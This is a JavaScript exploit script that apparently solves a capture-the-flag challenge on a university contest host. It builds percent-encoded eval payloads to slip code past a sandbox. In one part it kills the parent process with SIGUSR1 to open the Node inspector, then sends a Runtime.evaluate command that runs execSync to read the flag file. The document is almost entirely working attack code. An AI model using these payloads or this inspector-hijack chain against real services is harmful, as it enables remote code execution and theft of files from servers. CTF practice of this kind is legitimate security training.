function generatePayload(code) {
  return `eval(unescape(/%2f%0a${[...code]
    .map((_) => '%' + _.charCodeAt(0).toString(16).padStart(2, '0'))
    .join('')}%2f/))`
}

async function run(code, mode) {
  const expr = generatePayload(code)
  // console.log(expr)
  const resp = await fetch(
    'https://prob09-$HASH.geekgame.pku.edu.cn/submit',
    {
      headers: {
        'content-type': 'application/json',
        cookie: '$COOKIE'
      },
      body: JSON.stringify({ expr, mode }),
      method: 'POST'
    }
  )
  if (!resp.ok) {
    console.log(resp.status)
    console.log(await resp.text())
    throw new Error('Failed to run code')
  }
  const { result } = await resp.json()
  return result
}

async function getFlag2() {
  const code = `/flag{.+}/.exec(document.querySelector('script').innerText)[0]`
  const result = await run(code, 'browser')
  return result
}

console.log(await getFlag2())

async function getFlag3() {
  await run(`process.kill(process.ppid, 'SIGUSR1')`, 'node')
  const code = `fetch('http://127.0.0.1:9229/json/list').then(res => res.text())`
  const { webSocketDebuggerUrl } = JSON.parse(await run(code, 'node'))[0]
  const frontend = `
new Promise(res => {
  const ws = new WebSocket('${webSocketDebuggerUrl}');
  ws.onopen = () => {
    ws.onmessage = (e) => {
      res(e.data);
    };
    ws.send(JSON.stringify({
      id: 1,
      method: 'Runtime.evaluate',
      params: {
        expression: "require('child_process').execSync('/bin/dd if=/flag').toString()"
      },
    }));
  };
})
  `
  const result = await run(frontend, 'browser')
  return JSON.parse(result).result.result.value
}

console.log(await getFlag3())
